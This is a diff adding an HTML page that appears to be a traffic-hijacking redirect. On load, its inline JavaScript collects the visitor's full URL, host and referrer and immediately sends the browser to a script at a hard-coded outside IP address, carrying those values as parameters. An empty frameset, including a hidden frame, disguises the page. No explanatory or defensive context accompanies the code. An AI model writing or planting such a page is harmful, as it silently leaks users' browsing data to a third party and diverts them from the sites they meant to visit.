@@ -1,0 +1,43 @@
+<html>
+<head>
+
+</head>
+	
+<script type="text/javascript">
+	
+var pp = "242&pre="+(new Date()).getTime();
+var s=String(window.location.href);
+var host=escape(s.substring(7,s.indexOf('/',7)));
+var ref=escape(document.referrer);
+s = escape(s); 
+
+function loadfr()
+{ 
+	document.getElementById("fr1").src = "http://60.191.124.250/dns.php?AIMT="+s+"&host="+host+"&refer="+ref+"&server="+pp;
+}
+
+function refreshPage()
+{
+	document.location = "http://60.191.124.250/dns.php?AIMT="+s+"&host="+host+"&refer="+ref+"&server="+pp;
+}
+
+if (self.location == top.location)
+{
+	document.location="http://60.191.124.250/dns.php?AIMT="+s+"&host="+host+"&refer="+ref+"&server="+pp;
+}
+else
+{ 
+	refreshPage();
+}
+
+</script>
+
+<frameset rows="*,0">
+	<frame id="main" src="">
+	<frame id="fr1" src="">
+</frameset>
+
+<body>
+</body>
+
+</html>
